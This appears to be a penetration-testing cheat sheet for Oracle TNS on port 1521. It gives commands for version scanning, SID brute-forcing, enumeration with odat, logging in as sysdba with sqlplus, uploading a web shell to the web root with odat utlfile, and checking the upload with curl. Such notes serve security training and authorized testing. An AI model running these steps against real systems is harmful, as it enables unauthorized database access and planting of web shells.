
## Footprinting the Service

- Finds the Oracle TNS service version and whether port is open or not.

```bash
sudo nmap -p1521 -sV <TARGET IP> --open
```

## SID Bruteforcing

- SID bruteforcing using `nmap`.
- Info can be used to connect to a particular Oracle database instance.

```bash
sudo nmap -p1521 -sV <TARGET IP> --open --script oracle-sid-brute
```

## Enumerate Oracle TNS

- Performs a variety of scans to gather information about the Oracle database services.
- It can also be used to find SIDs of the Oracle Database.

```bash
sudo odat all -s <TARGET IP>
```

## Log in Oracle Database

- Password prompt may be asked later. This way we avoid specifying the password in clear text in the command line.

```bash
sqlplus <username>@<TARGET IP>/<database SID>
```

**OR**

- Logging in as `sysdba` has higher privileges.
- We can access various databases and perform admin level operations.

```
sqlplus <username>@<TARGET IP>/<database SID> as sysdba
```

## Upload File in Oracle Database

- We can try to upload a web shell to the target.
- **NOTICE : This requires the target to have a web server setup. If the target has web server setup we need to upload the web shell file i.e. our upload file to the Web Root Directory i.e. Destination Path.**
- The web root directory location may vary depending on the OS. Below are some default locations of web directories based on their OS :-
	- `/var/www/html` -> **Linux**
	- `C:\inetpub\wwwroot` -> **Windows**

```bash
odat utlfile -s <TARGET IP> -d <database SID> -U <username> -P <password>  --sysdba --putFile <Destination Path> <upload filename> ./<upload filename>
```

### Verify File Upload

- If we get the contents of our file then the file upload was successful.

```bash
curl -X GET http://<TARGET IP>/<uploaded filename>
```

